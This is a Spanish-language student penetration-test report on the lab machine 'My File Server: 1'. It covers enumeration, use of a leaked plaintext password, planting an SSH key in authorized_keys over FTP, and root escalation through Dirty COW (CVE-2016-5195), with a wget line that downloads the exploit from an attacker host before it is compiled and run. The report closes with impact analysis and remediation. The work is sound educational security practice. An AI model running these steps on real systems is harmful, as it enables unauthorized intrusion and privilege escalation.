ACTIVIDAD 09: Red Team Report – Pentesting de My File Server 1 y Escalada mediante Dirty COW

Resumen Ejecutivo

El presente informe documenta la prueba de penetración realizada sobre la máquina vulnerable My File Server: 1. El objetivo fue evaluar la exposición de servicios, la existencia de credenciales expuestas y la posibilidad de escalada de privilegios. Durante la evaluación se identificaron credenciales en texto plano dentro de /readme.txt, un recurso SMB (smbdata) accesible con permisos de lectura/escritura y una vulnerabilidad local de escalada (explotación de Dirty COW) que permitió la obtención de privilegios de root. El riesgo combinado es alto.

Alcance

Evaluación negra (black-box) de la máquina virtual My File Server: 1 con IP 192.168.56.103.

Actividades incluidas

  • Reconocimiento de red.
  • Escaneo de puertos y servicios.
  • Enumeración de servicios web y SMB.
  • Intento de explotación de vulnerabilidades públicas.
  • Pruebas de escalada de privilegios locales.

Fuera del alcance

  • Ataques de denegación de servicio.
  • Cambios permanentes en sistemas de terceros.

Metodología Aplicada

Enfoque estructurado basado en las fases PTES/OWASP:

  • Fase 1: Reconocimiento pasivo y activo.
  • Fase 2: Enumeración detallada de servicios y versiones.
  • Fase 3: Identificación y validación de vulnerabilidades.
  • Fase 4: Explotación controlada para demostrar impacto.
  • Fase 5: Post-explotación y escalada de privilegios.
  • Fase 6: Análisis de impacto y recomendaciones.

Fases de Reconocimiento

Se realizó reconocimiento pasivo con netdiscover para detectar hosts activos. Se identificó la IP 192.168.56.103 como la máquina víctima.

Se ejecutó un escaneo activo de puertos y servicios con el siguiente comando para obtener la lista exhaustiva de puertos abiertos y versiones:

nmap -p- 192.168.56.103 -sV

Enumeración

Se utilizaron herramientas de enumeración para determinar vectores de ataque.

Enumeración web con Nikto

Se ejecutó nikto -h para enumerar directorios del servicio web. Nikto reveló el fichero /readme.txt. Al abrirlo se encontró la cadena "My password is rootroot1". Con esto se obtuvo la contraseña rootroot1 del usuario smbuser.

Enumeración SMB con smbmap

Se usó sudo smbmap -H para enumerar los recursos compartidos. smbmap mostró el recurso smbdata con permisos de lectura y escritura (R/W).

Servicio HTTP

El servicio HTTP reportó versión Apache 2.4.6.

Explotación

Se utilizó el comando ftp para conectarse al servidor de archivos. Los pasos realizados fueron:

  • Se generó la llave SSH con sudo ssh-keygen.
  • Se subió al servidor remoto con put id_ed25519.pub authorized_keys.
  • Se accedió con ssh smbuser@192.168.56.103 sin necesidad de contraseña.

Escalada de Privilegios

La escalada empleada fue Dirty COW (CVE-2016-5195), que explota una condición de carrera en el mecanismo copy-on-write del kernel Linux. Los pasos realizados fueron:

  • Se descargó el exploit con wget http://192.168.56.102:8080/dirtyCow.c.
  • Se compiló con gcc dirtyCow.c -o Aznar -pthread.
  • Se ejecutó ./Aznar.

La ejecución del exploit permitió escalar privilegios dentro del sistema, obteniendo acceso como root.

Análisis de Impacto (Modelo CIA)

  • Confidencialidad: Comprometida por credenciales en texto plano (/readme.txt) y la posibilidad de leer el share SMB.
  • Integridad: Vulnerable ante modificaciones no autorizadas en el share (permisos R/W) y la capacidad de reemplazar binarios o ficheros críticos tras la escalada.
  • Disponibilidad: Posible interrupción si se eliminan o corrompen ficheros críticos o si el atacante instala procesos maliciosos.

Riesgo global: Alto.

Recomendaciones Técnicas

  • 1. Crítico (inmediato): Parchear el kernel para mitigar CVE-2016-5195; si no es posible, aislar la VM.
  • 2. Alto: Eliminar credenciales en texto plano, rotar contraseñas expuestas.
  • 3. Alto: Restringir permisos del share SMB usando ACLs y principios de menor privilegio; deshabilitar accesos anónimos.
  • 4. Medio: Revisar y actualizar Apache (y demás servicios) según CVE.
  • 5. Medio: Habilitar registros (auditd, syslog remoto) y alertas para accesos SMB/HTTP.
  • 6. Bajo: Implementar gestión de secretos (vault).
